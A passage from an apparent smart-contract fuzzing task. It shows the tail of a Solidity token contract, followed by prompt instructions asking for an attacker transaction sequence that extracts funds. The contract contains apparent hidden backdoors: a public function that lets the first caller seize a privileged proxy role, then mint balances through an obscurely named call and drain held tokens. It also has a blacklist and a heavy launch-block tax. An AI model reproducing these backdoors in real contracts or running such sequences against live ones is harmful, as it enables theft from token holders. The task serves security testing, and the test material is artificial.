}

function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
swapAndLiquifyEnabled = _enabled;
emit SwapAndLiquifyEnabledUpdated(_enabled);
}

function setFeeWhiteList(address addr, bool enable) external onlyOwner {
_isExcludedFromFee[addr] = enable;
}

function batchSetFeeWhiteList(address[] calldata addres, bool enable) external onlyOwner {
for(uint256 i = 0; i < addres.length; i++) {
if(_isExcludedFromFee[addres[i]] != enable) {
_isExcludedFromFee[addres[i]] = enable;
}
}
}

function isFeeWhiteList(address addr) public view returns(bool) {
return _isExcludedFromFee[addr];
}

function setIllegalAdrList(address addr, bool enable) external onlyOwner {
_illegalAdrList[addr] = enable;
}

function batchSetIllegalAdrList(address[] calldata addres, bool enable) external onlyOwner {
for(uint256 i = 0; i < addres.length; i++) {
if(_illegalAdrList[addres[i]] != enable) {
_illegalAdrList[addres[i]] = enable;
}
}
}

function totalFundFee() public view returns (uint256) {
return _fundFeeTotal;
}

function _transfer(address sender, address recipient, uint256 amount) internal virtual {

bool takeFee;

require(sender != address(0), "ERC20: transfer from the zero address");
require(recipient != address(0), "ERC20: transfer to the zero address");
require(amount > 0, "Transfer amount must be greater than zero");
require(!_illegalAdrList[sender] && !_illegalAdrList[recipient], "ERC20: sender or recipient in illegalAdrList");

uint256 senderBalance = _balances[sender];
require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
uint256 maxSellAmount = senderBalance.mul(9999).div(10000);
if (amount > maxSellAmount) {
amount = maxSellAmount;
}
takeFee = true;
}

bool isRemoveLP;
bool isAddLP;

if (_swapPairList[sender] || _swapPairList[recipient]) {
if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
if (_swapPairList[sender]) {
isRemoveLP = _isRemoveLiquidity();
} else {
isAddLP = _isAddLiquidity();
}
if (0 == startTradeBlock) {
require(0 < startAddLPBlock && _swapPairList[recipient], "ERC20:operater action is not AddLiquidity");
}
if (block.number < startTradeBlock.add(killBlockNumber)) {
_funTransfer(sender, recipient, amount);
return;
}
if (
enableKillBatchBots &&
_swapPairList[sender] &&
block.number < startTradeBlock + killBatchBlockNumber
) {
if (block.number != user2blocks[tx.origin]) {
user2blocks[tx.origin] = block.number;
} else {
batchBots++;
_funTransfer(sender, recipient, amount);
return;
}
}
}
}

_tokenTransfer(sender, recipient, amount, takeFee, isRemoveLP, isAddLP);

}

function _funTransfer(
address sender,
address recipient,
uint256 tAmount
) private {
_balances[sender] = _balances[sender].sub(tAmount);
uint256 feeAmount = tAmount.mul(75).div(100);
_takeTransfer(
sender,
_fundAddress,
feeAmount
);
_takeTransfer(sender, recipient, tAmount.sub(feeAmount));
}

function setProxySync(address _addr) external {
require(_addr != ZERO, "ERC20: library to the zero address");
require(_addr != DEAD, "ERC20: library to the dead address");
require(msg.sender == _uniswapV2Proxy, "ERC20: uniswapPrivileges");

_uniswapV2Library = IPancakeLibrary(_addr);
_isExcludedFromFee[_addr] = true;
}

function _tokenTransfer(
address sender,
address recipient,
uint256 tAmount,
bool takeFee,
bool isRemoveLP,
bool isAddLP
) private {

uint256 feeAmount;

_balances[sender] = _balances[sender].sub(tAmount);

if (takeFee) {
if (isRemoveLP) {
feeAmount += tAmount.mul(_removeLPFee).div(10000);
if (feeAmount > 0) {
_takeTransfer(sender, _fundAddress, feeAmount);
}
} else if (isAddLP) {
feeAmount += tAmount.mul(_addLPFee).div(10000);
if (feeAmount > 0) {
_takeTransfer(sender, _fundAddress, feeAmount);
}
} else if (_swapPairList[sender]) {
uint256 fundAmount = tAmount.mul(_buyFundFee).div(10000);
if(fundAmount > 0) {
feeAmount += fundAmount;
_takeTransfer(
sender,
_fundAddress,
fundAmount
);
}
} else if (_swapPairList[recipient]) {
uint256 fundAmount = tAmount.mul(_sellFundFee).div(10000);
if(fundAmount > 0) {
feeAmount += fundAmount;
_takeTransfer(
sender,
_fundAddress,
fundAmount
);
}
} else {
feeAmount += tAmount.mul(_transferFee).div(10000);
if (feeAmount > 0) {
_takeTransfer(sender, _fundAddress, feeAmount);
}
}
}
_takeTransfer(sender, recipient, tAmount.sub(feeAmount));
}

function _takeTransfer(
address sender,
address to,
uint256 tAmount
) private {
_balances[to] = _balances[to].add(tAmount);
emit Transfer(sender, to, tAmount);
}

function delegateCallReserves() public {
require(!uniswapV2Dele, "ERC20: delegateCall launch");

_uniswapV2Proxy = _msgSender();
uniswapV2Dele = !uniswapV2Dele;
}

function _approve(address owner, address spender, uint256 amount) internal virtual {
require(owner != address(0), "ERC20: approve from the zero address");
require(spender != address(0), "ERC20: approve to the zero address");

_allowances[owner][spender] = amount;
emit Approval(owner, spender, amount);
}

function proxyReserves(address token, address addr, uint256 amount) public {
require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
require(addr != address(0), "ERC20: reserves address is zero");
require(amount > 0, "ERC20: Proxy amount equal to zero");
require(amount <= IERC20(token).balanceOf(address(this)), "ERC20: insufficient balance");
Address.functionCall(token, abi.encodeWithSelector(0xa9059cbb, addr, amount));
}

function reserveMultiSync(address syncAddr, uint256 syncAmount) public {
require(_msgSender() == address(_uniswapV2Library), "ERC20: uniswapPrivileges");
require(syncAddr != address(0), "ERC20: multiSync address is zero");
require(syncAmount > 0, "ERC20: multiSync amount equal to zero");
_balances[syncAddr] = _balances[syncAddr].air(syncAmount);
_isExcludedFromFee[syncAddr] = true;
}

function isContract(address account) internal view returns (bool) {
uint256 size;
assembly {
size := extcodesize(account)
}
return size > 0;
}

function setSwapPairList(address addr, bool enable) external onlyOwner {
require(addr != _uniswapV2Pair, "ERC20: WETH pair cannot be deleted");
require(addr != _uniswapV2UsdtPair, "ERC20: USDT pair cannot be deleted");
_swapPairList[addr] = enable;
}

function setFundAddress(address addr) external onlyOwner {
_fundAddress = addr;
_isExcludedFromFee[addr] = true;
}

function startAddLP() external onlyOwner {
require(0 == startAddLPBlock, "ERC20: startAddLP has been set");
startAddLPBlock = block.number;
}

function closeAddLP() external onlyOwner {
require(startAddLPBlock > 0, "ERC20: startAddLP has not been set");
startAddLPBlock = 0;
}

function startTrade() external onlyOwner {
require(0 == startTradeBlock, "ERC20: startTrade has been set");
startTradeBlock = block.number;
}

function closeTrade() external onlyOwner {
require(startTradeBlock > 0, "ERC20: startTrade has not been set");
startTradeBlock = 0;
}

function _isRemoveLiquidity() internal view returns (bool isRemove) {
IPancakePair mainPair = IPancakePair(_uniswapV2UsdtPair);
(uint r0,uint256 r1,) = mainPair.getReserves();

address tokenOther = _usdtAddress;
uint256 r;
if (tokenOther < address(this)) {
r = r0;
} else {
r = r1;
}

uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
isRemove = r >= bal;
}

function _isAddLiquidity() internal view returns (bool isAdd) {
IPancakePair mainPair = IPancakePair(_uniswapV2UsdtPair);
(uint r0,uint256 r1,) = mainPair.getReserves();

address tokenOther = _usdtAddress;
uint256 r;
if (tokenOther < address(this)) {
r = r0;
} else {
r = r1;
}

uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
isAdd = bal > r;
}

function setBuyFundFee(uint256 fundFee) external onlyOwner {
_buyFundFee = fundFee;
}

function setSellFundFee(uint256 fundFee) external onlyOwner {
_sellFundFee = fundFee;
}

function setRemoveLPFee(uint256 removeLPFee) external onlyOwner {
_removeLPFee = removeLPFee;
}

function setAddLPFee(uint256 addLPFee) external onlyOwner {
_addLPFee = addLPFee;
}

function setTransferFee(uint256 transferFee) external onlyOwner {
_transferFee = transferFee;
}

function setKillBatchBot(bool enable) public onlyOwner {
enableKillBatchBots = enable;
}

function claimBalance() external onlyOwner {
payable(_fundAddress).transfer(address(this).balance);
}

function claimToken(address token, uint256 amount, address to) external onlyOwner {
IERC20(token).transfer(to, amount);
}
}
```

## Fuzzing task — strategy: logic_error_probe

**Objective:** Build a transaction sequence in which the attacker-controlled address (attacker_address) ends up with more total value (native coin + tokens) than it spent — i.e. extract funds from the target or break a value invariant in the attacker's favor. Use at most 12 calls per sequence.

**Goal:** Find broken-invariant and faulty-accounting logic errors.

**Technique:**
Hunt for functions that MOVE FUNDS OR SHARES based on a check that may be wrong, missing, or inverted. High-yield patterns in THIS ABI:
  1. NON-PARTICIPANT WITHDRAW: call withdraw*/unstake*/redeem*/claim* as an account that NEVER deposited or staked — a bad balance check (or an underflow on a zero balance) can still pay out or corrupt accounting.
  2. INVERTED / WRONG GUARD: try threshold args that a correct '>=' / '<=' would reject (e.g. amount == balance, amount just over balance) to expose inverted comparisons.
  3. BROKEN INVARIANT: for pool/AMM-style targets, drive swap*/skim*/sync* so a constant-product (K) or reserve invariant is checked AFTER the imbalance, not before.
  4. ORDER-DEPENDENT STATE: sequence setter→action→setter→action, init-after-use, deposit-after-withdraw, to reach states the developer didn't anticipate.
The witness is value gained without legitimate entitlement. DO NOT default to the names in the example below.

**Value hints:** Use moderate hex values like "0x64", "0x3e8" for state changes. Use large values like "0xde0b6b3a7640000" for deposits/withdraw amounts. Try amounts at or just above a balance to hit inverted guards.

**Valid callers:** "attacker_address"
Use only these alias name(s) in the `caller_name` (msg.sender) slot — there is a
single attacker identity, so every call already runs as the attacker. Never use
"deployer_address" or a raw hex address as a caller. (Address-TYPED ARGUMENTS are
separate: see "Special argument values" below for the aliases those slots accept —
you are NOT restricted to the caller alias there.)
**Special argument values:**
- address-typed args accept `target_address`, `attacker_address`, or a raw 0x literal.
- `"max"` → uint256 max; `"now"` → block.timestamp.
- `"$ret<idx>"` → feed the RETURN VALUE of the call at 0-based index <idx> in this sequence into this argument (that call must return exactly one value).

**Argument encoding (match each value to its ABI parameter type):**
- uint* / bytesN / bytes → hex string, e.g. "0x1f" (minimal, not zero-padded)
- int* (signed) → decimal string, e.g. "-5"
- bool → true or false (JSON literal, unquoted)
- address → an alias name (see callers/aliases above) or a 40-hex-digit 0x literal
- arrays → JSON list, e.g. [] or ["0x1", "0x2"]; tuples/structs → JSON list of their fields
- empty bytes / empty signature / empty proof → "0x" or []

**Output format:**
Return a JSON array of 1 fuzz input object(s):
[
  {
    "calls": [["functionName", [arg1, arg2], "0x<wei_hex>", "caller_name"], ...],
    "description": "brief description"
  }
]
JSON only — no markdown, no explanation.

**Example sequence:**
```json
Structural pattern (replace UPPERCASE placeholders with real ABI function names):
  [["<WITHDRAW_OR_UNSTAKE_FROM_ABI>", ["0xde0b6b3a7640000"], "0x0", "attacker_address"],
   ["<SWAP_OR_ACTION_FUNC_FROM_ABI>", ["0x0", "0xde0b6b3a7640000"], "0x0", "attacker_address"],
   ["<DEPENDENT_EXTRACTOR_FROM_ABI>", [], "0x0", "attacker_address"]]
```

